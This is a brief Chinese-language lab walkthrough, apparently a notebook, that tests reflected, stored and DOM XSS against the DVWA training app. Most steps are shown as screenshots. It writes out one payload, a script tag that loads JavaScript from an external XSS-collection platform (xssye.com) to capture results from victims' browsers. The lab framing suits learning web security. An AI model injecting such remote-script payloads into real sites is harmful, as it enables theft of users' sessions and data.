## 准备工作
### 设置DVWA的安全度为最低  
<img src="http://wujiashuaitupiancunchu.oss-cn-shanghai.aliyuncs.com/jupyter_notebook_img/00e8scj3w606e.png" width="600px" />

### 在在线xss平台新建一个项目  
<img src="http://wujiashuaitupiancunchu.oss-cn-shanghai.aliyuncs.com/jupyter_notebook_img/5tlnndoshnt.png" width="600px" />

下一步  
<img src="http://wujiashuaitupiancunchu.oss-cn-shanghai.aliyuncs.com/jupyter_notebook_img/nrte1p5bcip.png" width="600px" />

获取到在线js代码  
<img src="http://wujiashuaitupiancunchu.oss-cn-shanghai.aliyuncs.com/jupyter_notebook_img/abuxfnhhxrq.png" width="600px" />


## 测试反射xss

```html
<script src=http://xssye.com/laPM></script>
```


将这条语句放入  
<img src="http://wujiashuaitupiancunchu.oss-cn-shanghai.aliyuncs.com/jupyter_notebook_img/u5svwnl8s2n.png" width="600px" />

### 返回xss在线平台查看注入结果  
<img src="http://wujiashuaitupiancunchu.oss-cn-shanghai.aliyuncs.com/jupyter_notebook_img/en89i2mki6b.png" width="600px" />


## 测试存储xss  
<img src="http://wujiashuaitupiancunchu.oss-cn-shanghai.aliyuncs.com/jupyter_notebook_img/yp4g1obf3ud.png" width="600px" />

查看结果,已经注入到页面了.
<img src="http://wujiashuaitupiancunchu.oss-cn-shanghai.aliyuncs.com/jupyter_notebook_img/kiuovzgllg.png" width="600px" />

## DOM注入  
![image.png](http://wujiashuaitupiancunchu.oss-cn-shanghai.aliyuncs.com/jupyter_notebook_img/sim8fagii5l.png)

### 查看结果

```{.python .input}

```
